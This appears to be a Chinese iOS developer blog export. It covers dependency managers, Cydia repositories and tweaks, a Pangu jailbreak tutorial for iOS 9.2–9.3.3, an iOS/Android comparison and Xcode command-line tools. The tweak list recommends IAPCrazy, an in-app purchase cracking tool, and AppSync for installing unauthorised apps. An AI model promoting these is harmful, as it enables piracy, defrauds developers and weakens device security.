简介CocoaPods是一个用来帮助我们管理第三方依赖库的工具。它可以解决库与库之间的依赖关系，下载库的源代码，同时通过创建一个Xcode的workspace来将这些第三方库和我们的工程连接起来，供我们开发使用。\n使用CocoaPods的目的是让我们能自动化的、集中的、直观的管理第三方开源库。\n\n\n检查Mac是否安装Ruby和gem在终端中输入命令：ruby --version 和gem --version\n$ ruby --versionruby 2.0.0p643 (2015-02-25 revision 49749) [x86_64-darwin14.3.0]$ gem --version2.4.8\n\nRuby 是一门开发语言，gem 为 Ruby 第三方库管理工具，CocoaPods 是用 Ruby 写的一个第三方工具。\nRuby的版本需要大于 2.2.2版本。如果小于该版本，通过以下方式安装更高版本的 Ruby。\n安装 Ruby 环境\n安装 Xcode 及 Command Line Tools。安装 Command Line Tools 命令：xcode-select --install\n安装 RVM，Ruby 的多版本管理工具。并通过 RVM 安装更高版本的 Ruby。\n\n  $ curl -L https://get.rvm.io | bash -s stable$ source ~/.rvm/scripts/rvm$ rvm install 2.3.0$ rvm use 2.3.0$ /bin/bash --login\n\n修改 gem 镜像\n\n  $ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/$ gem sources -lhttps://gems.ruby-china.org# 确保只有 gems.ruby-china.org\n\n安装 CocoaPods安装\n$ gem install cocoapods\n\n初始化 CocoaPods 环境\n$ pod setup\n\n初始化环境需要更新下载 CocoaPods 仓库，该步骤花费很长时间。更简便的方式是：从其他已初始化好的电脑上，拷贝目录 ~/.cocoapods/repos/ 到本机的相同目录中。\n使用 CocoaPods\n创建 Xcode 工程并切换到该工程路径\n\n使用命令 pod init 在当前文件夹下生成一个 Podfile 文件\n\n编辑 Podfile，输入如下类似信息：\n $ vim Podfileplatform :ios, &#x27;8.0&#x27;# 屏蔽 CocoaPods 库里面的所有警告inhibit_all_warnings!\ttarget &#x27;CocoaPodsDemo&#x27; do  # 可以用framework的pod替代静态库  # use_frameworks!\t  # Pods for CocoaPodsDemo  pod &quot;AFNetworking&quot;, &quot;~&gt; 2.5.4&quot;  pod &#x27;SDWebImage&#x27;  pod &#x27;KVNProgress&#x27;\t  target &#x27;CocoaPodsDemoTests&#x27; do    inherit! :search_paths    # Pods for testing  end\t  target &#x27;CocoaPodsDemoUITests&#x27; do    inherit! :search_paths    # Pods for testing  end\tend   \nPod 语法格式为：pod &#39;第三库名称&#39;, &#39;版本号&#39;，一个依赖项通过pod名和可选的版本号来声明。\npod &#x27;AFNetworking&#x27;, &#x27;~&gt; 2.5.4&#x27;\n最新版本的依赖，可以忽略版本号，这样写：\npod &#x27;AFNetworking&#x27;\n指定Pod固定版本，可以写上具体的版本号来指定：\npod &#x27;AFNetworking&#x27;, &#x27;2.5.4&#x27;\n版本号标识区别：\n\n&gt;1.0        高于1.0的任何版本&gt;&#x3D; 1.0    至少版本为1.0&lt;1.0        低于1.0的任何版本&lt;&#x3D;1.0**        版本1.0和任何低于1.0的版本**~&gt; 1.0     兼容1.0版本的最新版&#x3D;&#x3D; 1.0或1.0    都表示指定版本\n\ninhibit_all_warnings!：屏蔽 CocoaPods 库里面的所有警告use_frameworks!：可以用framework的pod替代静态库\n\n安装工程依赖的第三方库\n$ pod installUpdating local specs repositoriesAnalyzing dependenciesDownloading dependenciesInstalling AFNetworking (2.5.4)Installing KVNProgress (2.2.2)Installing SDWebImage (3.7.3)Generating Pods projectIntegrating client project[!] Please close any current Xcode sessions and use `CocoaPodsDemo.xcworkspace` for this project from now on.Sending statsPod installation complete! There are 3 dependencies from the Podfile and 3 totalpods installed.\n\n若出现pods installed字样表示安装成功。\n\n关闭Xcode工程，打开.xcworkspace文件。\n\n在工程中导入第三库文件，只需要#import &lt;AFNetworking.h&gt;类似的即可，开启CocoaPods之旅。\n\n\n更多用法参考本文提供的参考链接。\n参考链接\nhttp://code4app.com/article/cocoapods-install-usage\nhttp://blog.csdn.net/wzzvictory/article/details/18737437\nhttp://blog.csdn.net/wzzvictory/article/details/19178709\n\nCarthageCarthage 简介Carthage的目标是用最简单的方式来管理Cocoa第三方框架。\nCarthage编译你的依赖，并提供框架的二进制文件，但你仍然保留对项目的结构和设置的完整控制。Carthage不会自动的修改你的项目文件或编译设置。\nCarthage只正式支持动态框架，动态框架能够在任何版本的OS X上使用，但只能在iOS 8及以上版本使用。\n安装 HomebrewOS X 不可或缺的套件管理器，用于安装命令工具。\n终端中执行如下命令：\n/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;\n\n安装 Carthage终端执行命令安装Carthage\nbrew updatebrew install carthage\n\n使用Carthage\n创建Xcode工程并切换到该工程路径\n\n创建一个Cartfile，将你想要使用的框架列在里面\ngithub &quot;AFNetworking/AFNetworking&quot; ~&gt; 3.0github &quot;rs/SDWebImage&quot;\n运行carthage update，将获取依赖文件到一个Carthage.checkout文件夹，然后编译每个依赖\n\n在你的应用程序target的General设置标签中的Embedded Binaries区域，将框架从Carthage.build文件夹拖拽进去。\n\n\n参考链接\nhttp://www.cocoachina.com/ios/20141204/10528.html\n官方文档\n\nCarthage与CocoaPods的不同\nCarthage只支持iOS 8及以上版本使用。\n\n首先，CocoaPods默认会自动创建并更新你的应用程序和所有依赖的Xcode workspace。Carthage使用xcodebuild来编译框架的二进制文件，但如何集成它们将交由用户自己判断。CocoaPods的方法更易于使用，但Carthage更灵活并且是非侵入性的。\n\nCocoaPods的目标在它的README文件描述如下：\n\n…为提高第三方开源库的可见性和参与度，创建一个更中心化的生态系统。\n\n与之对照，Carthage创建的是去中心化的依赖管理器。它没有总项目的列表，这能够减少维护工作并且避免任何中心化带来的问题（如中央服务器宕机）。不过，这样也有一些缺点，就是项目的发现将更困难，用户将依赖于Github的趋势页面或者类似的代码库来寻找项目。\n\nCocoaPods项目同时还必须包含一个podspec文件，里面是项目的一些元数据，以及确定项目的编译方式。Carthage使用xcodebuild来编译依赖，而不是将他们集成进一个workspace，因此无需类似的设定文件。不过依赖需要包含自己的Xcode工程文件来描述如何编译。\n\n最后，我们创建Carthage的原因是想要一种尽可能简单的工具——一个只关心本职工作的依赖管理器，而不是取代部分Xcode的功能，或者需要让框架作者做一些额外的工作。CocoaPods提供的一些特性很棒，但由于附加的复杂性，它们将不会被包含在Carthage当中。\n\n\nSwift Package ManagerSwift包管理器是一个用于管理Swift代码分发的工具。它与Swift构建系统集成，自动化处理下载、编译和链接依赖关系。\n软件包管理器包含在Swift 3.0及更高版本中。\n安装配置macOS下载安装 Xcode 8.1。\nUbuntu Linux\n安装以下Linux 系统包：\n $ sudo apt-get update$ sudo apt-get install clang libicu-dev libcurl4-openssl-dev libssl-dev\n从 swift.org 下载 Swift 工具链。\n\n解压缩 .tar.gz 文件，更新 PATH 环境变量，包含以下工具：\n $ export PATH=&lt;path to uncompressed tar contents&gt;/usr/bin:$PATH\n\n开始使用\n创建工程路径\n $ mkdir myFirstProject\n使用 Swift 包管理器创建 Swift 工程\n $ cd myFirstProject$ swift package init --type executable\n在 myFirstProject 目录下的目录结构如下\n myFirstProject├── Package.swift├── Sources│   └── main.swift└── Tests\n在 Package.swift 中添加依赖项\n import PackageDescriptionlet package = Package(    name: &quot;myFirstProject&quot;,    dependencies: [        .Package(url: &quot;https://github.com/IBM-Swift/Kitura.git&quot;, majorVersion: 1, minor: 1)    ])\n编译程序\n $ swift build\n在代码中就可以通过 import Kitura 导入模块。 在 Sources&#x2F;main.swift 添加如下代码：\n  import Kitura// Create a new routerlet router = Router()// Handle HTTP GET requests to /router.get(&quot;/&quot;) &#123;    request, response, next in    response.send(&quot;Hello, World!&quot;)    next()&#125;// Add an HTTP server and connect it to the routerKitura.addHTTPServer(onPort: 8090, with: router)// Start the Kitura runloop (this call never returns)Kitura.run()\n运行\n $ .build/debug/myFirstProject\n在 macOS 上可以生成 Xcode 工程\n $ swift package generate-xcodeproj\n\n","categories":["iOS"],"tags":["CocoaPods","Carthage"]},{"title":"Cydia 源 和 插件","url":"/2016/12/07/Cydia-Sources-and-Tweaks/","content":"Cydia 源\nJBnow Repo http://repo.jbnow.me/\nBigBoss Repo http://apt.thebigboss.org/repofiles/cydia/\nModMyi Repo http://apt.modmyi.com/\nBiteYourApple Repo http://repo.biteyourapple.net/\nfilippoBiga http://filippobiga.me/repo/\nSINful iPhone Rep http://sinfuliphonerepo.com/ \nihacksrepo http://ihacksrepo.com/\niNsanelyi Repo http://repo.insanelyi.com\niHackStore Repo http://ihackstore.com/repo\nSinfuliPhone Repo http://sinfuliphonerepo.com/\niPhoneCake Repo http://cydia.iphonecake.com\n威锋源 http://apt.so/\nPP助手源 http://apt.25pp.com/\nIAPCrazy http://apt.youyuanapp.com\n小白源 http://apt.xbyy.cn\n\n\n\n100 免费的越狱插件\n20 Second Lockscreen\n3DNoLag\nDeleteForever\nAlkaline\nAlwaysMore For Spotlight\nAppendix\nApple File Conduit “2”\nCuttlefish\nBars\nBerryC8\nBetterFiveColumnHomescreen\nBetterFiveIconDock\nBloard\nBlurryBadges\nCream\nBreadcrumbsAway\nBrowser Changer\nBytaFont 3\nCCDeseparator\nCCColor\nCCloader\nCCMeters\nCCircle\nCircleIcons\nCCBackground\nCylinder\nDetailedBatteryUsage\nEthos\nFaceDown\nCCSettings\nFlatSafariURL\nGlowBadge\nGoodges\nGrabberApp8\nHotDog\nIconBounce\nIncognito Messages\nInstabetter\nActivator\nLockGlyph\nMTerminal\nMessages Customiser\nMinimalHUD\nMobius\nSpotlightBeGone\nMultiIconMover\nNCReveal9\nNCIfNeeded\nNoAppStoreRedirect\nPM, Really?\nPhoneAppNoFav\nRePower\nPowerTap\nPriorityHUB\nPullToRespring\nSafariTabCount\nSafariCloseAllTabs\nSmoothCursor\nSpeed Intensifier\nRomanPasscode\nSendDelay\nStatusBarColor\nStatusBarTimer\nStatusModifier\nReturnToSender\nRoundDock\nSwipeSelection\nSwipeForMore\nTactful\nVintageSwitcher\nZeppelin\nFolder6Plus\nFullFolder9\nIconArt\nAppColorClose\nFloater\nFlashRing\nIconRenamer\nNCColor\nTintch\nRecord ‘n Torch\nTapTapFlip\nWink\nTransparentDock\nUnlock Sound\nBottomBar\nCask\nSwipyFolders\niCleaner\nSafariRefresh\nSpinSettings\nKeyboardVibrate8\nHarbor\n\n开发必备越狱插件\nApple File Conduit “2”: allow full file-system access over USB\nAppList: Allow extensions to read the list of installed apps\nAppsync: Appsync 允许安装AppStore 以外的应用到设备的补丁。\nCydia Substrate: powerful code insertion platform\nFlipboard FLEX Loader: dynamically loads Flipboard Explorer into apps\nIAPCrazy: 内购神器\niFile: 文件管理器\ntsProtector 8+(iOS 9 &amp; 8): protect system from subspicious apps\nCycript: runtime execution server and disassembler\nReveal Loader: dynamically loads Reveal into applications\nOpenSSH: secure remote access between machines\nMTerminal: 终端\n\n","categories":["iOS"],"tags":["Jailbreak","Cydia"]},{"title":"非官方iOS9.2-iOS9.3.3越狱图文教程","url":"/2016/12/07/Jailbreak-Using-Pangu-and-Cydia-Impactor/","content":"本越狱教程在 Windows 和 Mac 上都可以。\n越狱前须知\n备份，备份，备份\n支持设备: iPhone 5s iPhone 6 iPhone 6+ iPhone 6s iPhone 6s+ iPhone 5E iPod Touch 6G iPad Mini 2 iPad Mini 3 iPad Mini 4 iPad Air iPad Air 2 iPad Pro\n支持固件版本：iOS9.2 ~ iOS9.3.3\n电脑或者 Mac 安装iTunes，保证设备电量充足\n\n\n\n越狱步骤下载工具下载最新版的盘古越狱 IPA 文件。下载地址：http://www.iclarified.com/files/pangu/NvwaStone_1.0.ipa\n下载 Cydia Impactor。下载地址：http://www.cydiaimpactor.com\n安装 ImpactorMac：双击 Impactor dmg 安装\nWindows: 解压缩 Impactor zip\n运行 Impactor 并 连接 iPhone安装 NvwaStone IPA拖拽 NvwaStone IPA 文件到 Cydia Impactor 应用中。\n拖拽进去以后，将会要求你输入 Apple ID 和 密码，用来对 IPA 文件签名并且能够运行在你的设备上。不幸的是，如果你没有开发者账号，IPA 文件签名只有7天有效，也就是只能运行7天。如果你有开发者账号 IPA 文件签名有1年。\nCydia Impactor 将会显示一个警告给开发者：这个应用将会撤销和替换该账号已有的开发证书，这可能会影响你现在的开发工作。\nCydia Impactor 将会签名 IPA 并 安装盘古越狱 APP 到你的设备上。\n信任开发者描述文件盘古越狱 APP 安装到设备上后，你需要信任开发者描述文件。\n点击【设置】——&gt; 【通用】——&gt; 【描述文件与设备管理】，找到你在 Cydia Impactor 中填写的对应邮箱地址。PS: 开发者账号不用信任即可。\n运行 盘古越狱 APP回到主界面，运行 盘古越狱 APP。\n允许通知\n点击开始按钮\n锁屏等待6秒钟，你将会收到你的设备已经越狱成功的通知。\n解锁设备，重新进入盘古越狱APP，正在准备越狱环境和安装 Cydia。\n完成后，屏幕会重启，Cydia出现在主界面上。\n重要提示每次重启设备后，需要重新运行盘古越狱 APP 来恢复越狱环境。\n参考链接\nhttp://onlinejailbreak.com/osx\nhttp://onlinejailbreak.com/windows\n\n","categories":["iOS"],"tags":["Jailbreak","Cydia"]},{"title":"iOS vs Android","url":"/2016/12/30/iOS-vs-Android/","content":"系统架构iOSiOS系统分为可分为四级结构，由上至下分别为可触摸层（Cocoa Touch Layer）、媒体层（Media Layer）、核心服务层（Core Services Layer）、核心系统层（Core OS Layer），每个层级提供不同的服务。低层级结构提供基础服务如文件系统、内存管理、I&#x2F;O操作等。高层级结构建立在低层级结构之上提供具体服务如UI控件、文件访问等。\n可触摸层（Cocoa Touch Layer）可触摸层主要提供用户交互相关的服务如界面控件、事件管理、通知中心、地图，包含以下框架：\n\nUIKit（界面相关）\nEventKit（日历事件提醒等）\nNotification Center（通知中心）\nMapKit（地图显示）\nAddress Book（联系人）\niAd（广告）\nMessage UI（邮件与SMS显示）\nPushKit（iOS8新push机制）\n\n媒体层（Media Layer）媒体层主要提供图像引擎、音频引擎、视频引擎框架。\n\n图像引擎（Core Graphics、Core Image、Core Animation、OpenGL ES）\n音频引擎 （Core Audio、 AV Foundation、OpenAL）\n视频引擎（AV Foundation、Core Media）\n\n核心服务层（Core Services Layer）核心服务层为程序提供基础的系统服务例如网络访问、浏览器引擎、定位、文件访问、数据库访问等，主要包含以下框架：\n\nCFNetwork（网络访问）\nCore Data（数据存储）\nCore Location（定位功能）\nCore Motion（重力加速度，陀螺仪）\nFoundation（基础功能如NSString）\nWebkit（浏览器引擎）\nJavaScript（JavaScript引擎）\n\n核心系统层（Core OS Layer）核心系统层提供为上层结构提供最基础的服务如操作系统内核服务、本地认证、安全、加速等。\n\n操作系统内核服务（BSD sockets、I&#x2F;O访问、内存申请、文件系统、数学计算等）\n本地认证（指纹识别验证等）\n安全（提供管理证书、公钥、密钥等的接口）\n加速 (执行数学、大数字以及DSP运算,这些接口iOS设备硬件相匹配）\n\nAndroidAndorid 大致可以分为四层结构：应用层、应用框架层、系统运行库层、Linux内核层。\n应用层所有安装在手机上的应用程序都是属于这一层的，比如系统自带的联系人、短信等程序，或者是你从 Google Play 上下载的小游戏，当然还包括你自己开发的程序。\n应用框架层这一层主要提供了构建应用程序时可能用到的各种 API，Android 自带的一些核心应用就是使用这些 API 完成的，开发者也可以通过使用这些 API 来构建自己的应用程序。\n系统运行库层这一层通过一些 C&#x2F;C++ 库来为 Android 系统提供了主要的特性支持。如 SQLite 库提供了数据库的支持，OpenGL|ES 库提供了 3D 绘图的支持，WebKit 库提供了浏览器内核的支持等。\nLinux 内核层Android 系统是基于 Linux 内核的，这一层为 Android 设备的各种硬件提供了底层的驱动，如显示驱动、音频驱动、照相机驱动、蓝牙驱动、Wi-Fi 驱动、电源管理等。\n","categories":["软件设计"]},{"title":"Xcode 工具链","url":"/2017/01/04/Xcode-Toolchain/","content":"写在前面的话虽然我们来自不同背景、有不同观点，经历不同；虽然我们做事动机不同，信念、偏见和意见使我们彼此分离，有一件事我们是在一起的：\n不管好坏，我们都必须使用 Xcode。\nXcode 不仅仅只是一个应用程序，在 GUI 之下是一个应用程序和命令行工具的结合，它们与开发人员的工作流程一样是编辑器的核心。\n\n\nXcode Toolsxcode-select每个人与 Xcode 的旅程从一个选择开始。xcode-select提供了这个选择，尽管是一个永恒的问题：『蛋糕或死亡？』\n从 Mavericks 开始，在 Mac 上的开发者从执行一条命令开始：\n$ xcode-select --install\n\n将安装命令行工具，编译 Objective-C 代码必备的。\nxcrunxcrun 是 Xcode 基本的命令行工具。使用它可以调用其他工具。\n$ xcrun xcodebuild\n\n除运行命令之外，xcrun 可以查找文件和显示 SDK 的路径：\n$ xcrun --find clang$ xcrun --sdk iphoneos --find pngcrush$ xcrun --sdk macosx --show-sdk-path\n\n因为 xcrun 的执行是基于当前的 Xcode 版本环境（通过 xcode-select设置），所以在系统中能存在多个版本的 Xcode 工具链是非常容易的。\n在脚本和其他外部工具中使用 xcrun 能确保在不同环境中保证一致性。比如，Xcode 附带了代码分发工具 Git。通过调用 $ xcrun git 而不是 $ git，构建系统可以保证运行正确。\nxcodebuild第二个最重要的 Xcode 工具是 xcodebuild，顾名思义，构建 Xcode project 和 workspace。\n不用传递任何构建参数，xcodebuild 默认为 Xcode.app 最近使用的 scheme 和 配置：\n$ xcodebuild\n\n然而，任何 scheme、targets、配置、目标设备、SDK和导出数据位置都可以配置：\n$ xcodebuild -workspace NSHipster.xcworkspace -scheme &quot;NSHipster&quot;\n\n有六个可以依次调用的构建操作：\n\n\n\n操作\n描述\n\n\n\nbuild\n在构建根路径(SYMROOT)构建target。默认构建操作。\n\n\nanalyze\n在构建根路径(SYMROOT)构建和分析target或者scheme。需要指定 scheme。\n\n\narchive\n在构建根路径（SYMROOT）打包 scheme。需要指定 scheme。\n\n\ntest\n在构建根路径（SYMROOT）测试 scheme。需要指定 scheme和可选指定目标设备。\n\n\ninstallsrc\n拷贝工程源到源根路径（SRCROOT）。\n\n\ninstall\n构建target、安装到target在目标设备根路径（DSTROOT）的安装目录\n\n\nclean\n从构建根路径（SYMROOT）移除构建的产品和中间文件\n\n\ngenstringsgenstrings 工具从指定的C或者Objective-C源文件生成 .strings 文件。在不同的 locale 本地化应用程序使用 .strings 文件。在苹果的 Cocoa Core Competencies 中的 [Internationalization](https://developer.apple.com/library/mac/documentation/general/conceptual/devpedia-cocoacore/- Internationalization.html) 有相关的描述。\n$ genstrings -a /path/to/source/files/*.m\n\n每次在源文件中使用 NSLocalizedString，genstrings 将会追加 key 和 comment 到目标文件中。然后由开发人员为每个目标 locale 创建文件的副本， 并将该文件翻译。\nfr.lproj&#x2F;Localizable.strings\n/* No comment provided by engineer. */&quot;Username&quot;=&quot;nom d&#x27;utilisateur&quot;;/* &#123;User First Name&#125;&#x27;s Profile */&quot;%@&#x27;s Profile&quot;=&quot;profil de %1$@&quot;;\n\nibtool正如 genstrings 作用于源代码，而 ibtool 作用于 XIB 文件。\n$ ibtool --generate-strings-file Localizable.strings en.lpoj/Interface.xib\n\n本地化是它的主要功能，ibtool 还拥有对 Interface Builder 文档有效的其他几个功能。\n\n--convert： 更改所有对类名的引用\n--upgrade： 将文档升级到最新版\n--enable-auto-layout：启用自动布局\n--update-frames：更新框架\n--update-constraints：更新约束\n\niprofileriprofiler 测量应用程序的性能，而不启动 Instruments.app：\n$ iprofiler -allocations -leaks -T 15s -o perf -a NSHipster\n\n上面的命令将附加到 NSHipster 程序，运行15秒，分析内存分配和泄露，然后将结果写入perf文件。之后输出结果可以通过 Instruments.app 读取和显示。\nxed这个命令可以简单地打开 Xcode。\n$ xed NSHipster.xcworkspace\n\n通过传递 -w 参数，xed 将等待直到所有打开的窗口关闭。对于脚本化用户交互非常有用，例如提示用户编辑文件并继续一旦完成。\nagvtoolagvtool 用于读取和写入 Xcode工程 Info.plist 中的版本号。\n$ agvtool what-version\n\n返回当前版本\n$ agvtool next-version\n\n累加 CURRENT_PROJECT_VERSION 和 DYLIB_CURRENT_VERSION。传递 -all 选项将更新 Info.plist 中的 CFBundleVersion。\n其他工具除了上述的 Xcode 工具以外，还有一些其他用 xcrun 调用的程序：\n编译 &amp; 汇编\nclang: 编译 C、C++、Objective-C和 Objective-C 源文件。\nlldb: 调试C、C++、Objective-C 和 Objective-C 程序\nnasm: 汇编文件\nndisasm: 反汇编文件\nsymbols: 显示一个文件或者进程的符号信息。\nstrip: 删除或修改符号表附加到汇编器和链接编辑器的输出。\natos: 将数字内存地址转换为二进制映像或进程的符号。\n\n处理器\nunifdef: 从代码中移除条件宏 #ifdef。\nifnames: 在 C++ 文件中找出所有条件。\n\n库\nld: 将目标文件和库合并成一个文件。\notool: 显示目标文件或库的指定部分。\nar: 创建和维护库文档。\nlibtool: 使用链接器 ld 创建库。\nranlib: 更新归档库的目录。\nmksdk: 创建和更新 SDK。\nlorder: 列出目标文件的依赖。\n\n脚本\nsdef: 脚本定义提取器\nsdp: 脚本定义处理器\ndesdp: 脚本定义生成器\namlint: 检查 Automator 对问题的操作\n\n打包\ninstaller: 安装 OS X 包。\npkgutil: 读取和操纵 OS X 包。\nlsbom: 列出 bom（Bill of Mterials）内容。\n\n文档\nheaderdoc: 处理头文档。\ngatherheaderdoc: 编译和链接 headerdoc 输出。\nheaderdoc2html: 从 headerdoc 输出生成 HTML。\nhdxml2manxml: 从 headerdoc XML 输出翻译成被 xml2man 使用的文件。\nxml2man: 将 Man Page Generation Language（MPGL） XML文件转换为手册页。\n\nCore Data\nmomc: 编译 Managed Object Model(.mom)文件\nmapc: 编译 Core Data Mapping Model(.xcmappingmodel)文件\n\n第三方工具appledocCocoa 开发人员认为 Objective-C 的冗长有助于自注释代码。在 longMethodNamesWithNamedParameters: 和 明确的参数类型。Objective-C 方法不会留下太多的想象力。\n但是即使自注释代码也可以通过文档来改进，只用少量的努力就能够对他人产生显著的益处。\n在 Objective-C 中，选择的文档工具是 appledoc。使用 javadoc 类似的语法，appledoc 能够从 .h文件生成 HTML 和 Xcode 兼容的 .docset 文档，看起来几乎和苹果官方文档完全相同。\nObjective-C 文档由任何 @interface 或 @protocol 之前的 /** */ 注释块（注意额外的初始星号）以及任何方法或 @property 声明指定。文档还可能包含系统字段的标签，如参数或返回值：\n\n@param [param] [Description]: 描述应传递什么值或此参数\n@return [Description]: 描述方法的返回值\n@see [selector]: 提供 『参见』相关项目的参考\n@discussion [Discussion]: 提供额外的背景资料\n@warning [Description]: 调用异常或潜在的危险行为\n\nappledoc 可以通过以下命令安装：\n$ brew install appledoc\n\n要生成文档，需要在 Xcode 工程的根目录下执行 appledoc 命令，传递元数据比如工程名和公司名：\n$ appledoc --project-name CFHipsterRef --project-company &quot;NSHipster&quot; --company-id com.nshipster --output ~/Documents .\n\n从目标目录中找到的头文件中生成并安装一个Xcode .docset文件。\n通过传递 --help 参数可以找到其他配置选项（包括HTML输出）：\n$ appledoc --help\n\nxctool它可以直接替代 xcodebuild，也就是 Xcode.app 自己所依赖的底层工具。\n我们自己作为苹果硬件和软件的消费者，都清楚设计的重要性怎么强调都不为过。在这个方面，xctool 做得非常漂亮。构建过程的每一步都经过清晰的组织，使用 ANSI 彩色字符和一系列 Unicode 装饰字符，使得表现的方式既容易理解又具有视觉吸引力，同时 xctool 的美丽不仅仅体现了表面：构建过程同样支持以其他工具可读取的格式进行输出：\n$ xctool -reporter plain:output.txt build\n\npretty: (默认) 一个文字化的输出器，使用 ANSI 颜色和 unicode 符号来进行美化输出。\nplain: 类似 pretty, 不过没有颜色和 Unicode。\nphabricator: 把构建&#x2F;测试的结果输出为 JSON 数组，它可以被 Phabricator 的代码评审工具读取。\njunit: 把测试结果输出成和 JUnit&#x2F;xUnit 兼容的 XML 文件。\njson-stream: 一个由构建&#x2F;测试事件组成的 JSON 字典流，每行一个（示例输出）。\njson-compilation-database: 输出构建事件的 JSON Compilation Database ，它可以用于基于 Clang Tooling 的工具，例如 OCLint.\n\nxctool 相对于 xcodebuild 另一个主要的进步是，xctool 可以和 Xcode.app 一样执行应用测试（xcodebuild 不能区分项目 scheme 中哪些是测试使用的 target，更不用说在模拟器中执行测试了）。\n仅仅因为这一个原因，xctool 就深刻地影响了 Objective-C 社区中新兴的持续集成测试的规范。\n通过以下命令安装 xctool：\n$ brew install xctool\n\nOCLintOCLint 是一个静态代码分析工具，可以检查 Objective-C（也支持 C 和 C++）代码中常见的问题，例如空的 if&#x2F;else&#x2F;try&#x2F;catch&#x2F;finally 语句，未使用的本地变量和参数，大量复杂的没有注释的(NCSS)，具有圈复杂度或者 NPath 复杂度的代码，冗余的代码，代码“异味”，以及其他的不好的代码实践。\n安装 OCLint 最好的方式是通过 Homebrew Cask:\n$ brew cask install oclint\n\n还记得 xctool 的 json-compilation-database 输出选项吗？它的输出可以直接 被 OCLint 读取，供它进行魔法一般的静态分析。\n$ xctool -workspace NSHipster.xcworkspace -scheme &quot;NSHipster&quot; -reporter json-compilation-database build &gt; compile_commands.json$ oclint-json-compilation-database\n\nxcprettyxcpretty 类似于 xctool，改进了 xcodebuild 的构建输出，但是 xcpretty 不是尝试替换 xcodebuild，而是扩展并改进它。\n实际上，xcpretty 通过获取 xcodebuild 的管道输出而不是直接调用，充分体现了 Unix的可组合性理念：\n$ xcodebuild [flags] | xcpretty -c\n\n这种方法的一个主要好处是它真的很快——事实上，在某些情况下，xcpretty 实际上比直接调用 xcodebuild 快一点，因为它节省了打印到控制台的时间。\n与 xctool 的另一个共性是报告器功能，其具有格式化输出到JUnit风格的XML、HTML或上述OCTool 兼容的 json编译数据库格式。\nxcpretty 通过 RubyGems 安装：\n$ gem install xcpretty\n\nNomadNomad 是用于 iOS 和 OS X 开发的世界级命令行实用程序的集合。它自动化常见的管理任务，以便开发人员可以专注于构建和传输软件。\n每个工具可以单独安装，也可以一起安装：\n$ gem install nomad-cli\n\nCupertino应用程序 Provisioning 流程普遍被苹果开发人员厌恶。\n除了整个过程是一个从开始到完成的噩梦，许多操作需要通过 Web 界面进行交互。不仅需要大量的额外点击，但使得它非常不自动化。\nCupertino 提供一个命令行工具管理设备、provisioning proﬁle、app ID 和证书。\n$ ios devices:list+------------------------------+---------------------------------------+|Listing 2 devices. You can register 98 additional devices.|+---------------------------+------------------------------------------+| Device Name| Device Identifier|+---------------------------+------------------------------------------+| Johnny Appleseed iPad| 0123456789012345678901234567890123abcdef || Johnny Appleseed iPhone| abcdef0123456789012345678901234567890123 |+---------------------------+------------------------------------------+$ ios devices:add &quot;iPad 1&quot;=abc123$ ios devices:add &quot;iPad 2&quot;=def456 &quot;iPad 3&quot;=ghi789 ...\n\n通过以下命令单独安装：\n$ gem install cupertino\n\nShenzhenWeb 开发人员在 iOS 上的对应部分是能够在几秒钟内持续部署代码，而不是等待几天 Capertino 批准（有时拒绝！）更新。\n幸运的是，一个围绕着开发和企业分发的新兴产业已经兴起。第三方服务像 HockeyApp、DeployGate 和 TestFlight 提供给开发者更容易的范式注册测试用户和发送最新构建给QA。\nShenzhen 是进一步自动化此过程的工具，通过构建 .ipa文件，然后发布到 FTP&#x2F;SFTP服务器、S3 存储或者其他任何上述第三方服务。\n$ cd /path/to/iOS Project/$ ipa build$ ipa distribute:sftp --host HOST -u USER -p PASSWORD -P FTP_PATH\n\nHoustonHouston 是一个简单的工具发送苹果推送通知。传递凭据、构造消息并将其发送到设备。\n$ apn push &quot;&lt;token&gt;&quot; -c /path/to/apple_push_notification.pem -m &quot;Hello from the command line!&quot;\n\n这个工具对测试远程推送非常有用——尤其是在新应用中实现该功能。\nVenice不管怎样应用内购买已经成为app开发者最有利的商业模式。有了这么多，对某人的生活而言确保这些购买的有效性是首要的。\nVenice 是一个命令行程序，用于验证 Apple 应用内购买收据，并检索与收据数据相关的信息。\n$ iap verify /path/to/receipt+-----------------------------+-------------------------------+|Receipt|+-----------------------------+-------------------------------+| app_item_id||| bid| com.foo.bar|| bvrs| 20120427|| original_purchase_date| Sun, 01 Jan 2013 12:00:00 GMT || original_transaction_id| 1000000000000001|| product_id| com.example.product|| purchase_date| Sun, 01 Jan 2013 12:00:00 GMT || quantity| 1|| transaction_id| 1000000000000001|| version_external_identifier ||+-----------------------------+-------------------------------+\n\n像 Houston、Venice有一个客户端库组件，允许它部署在 Rails或 Sinatra应用程序上。验证服务器上的收据允许保留他们自己的过去购买记录，这对于最新的指标和历史分析是有用的。因此，任何人关于IAP需要认真对待是推荐的做法。\nDubaiPassbook 管理登机牌、电影票、零售优惠券和会员卡。使用 PassKit API，开发人员可以注册 Web 服务自动更新 Passbook的内容，例如登机牌上的登机口更改或会员卡添加积分。\nDubai可以很容易地从脚本或命令行生成 .pkpass 文件，允许快速迭代你的 pass 的设计和内容，或者在空中生成一次性的。\n$ pk generate Example.pass -T boarding-pass\n\n一旦生成了通行证，它可以用 Dubai 创建本地 HTTP 服务，允许通行证在 iOS 模拟器中实时预览：\n$ pk serve Example.pass -c /path/to/certificate.p12$ open http://localhost:4567/pass.pkpass\n\nFastlanefastlane 是一套自动化打包的工具集，用 Ruby 写的，用于 iOS 和 Android 的自动化打包和发布等工具。gym 是其中的打包命令。\n官网：https://fastlane.tools\nGitHub：https://github.com/fastlane/fastlane\nfastlane 包含了我们日常编码之后要上线时候进行操作的所有命令。\ndeliver: 上传屏幕截图、二进制程序数据和应用程序到AppStoresnapshot: 自动截取你的程序在每个设备上的图片frameit: 应用截屏外添加设备框架pem: 可以自动化地生成和更新应用推送通知描述文件sigh: 生成下载开发商店的配置文件produce: 利用命令行在 iTunes Connect 创建一个新的 iOS appcert: 自动创建 iOS 证书pilot: 最好的在终端管理测试和建立的文件boarding: 很容易的方式邀请beta测试gym: 建立新的发布的版本，打包match: 使用git同步你成员间的开发者证书和文件配置scan: 在iOS 和Mac app 上执行测试用例\n\n一个完整的发布过程可以用 fastlane描述成下面这样：\nlane :appstore do\tincrement_build_number\tcocoapods\txctool\tsnapshot\tsigh\tdeliver\tframeit\tsh 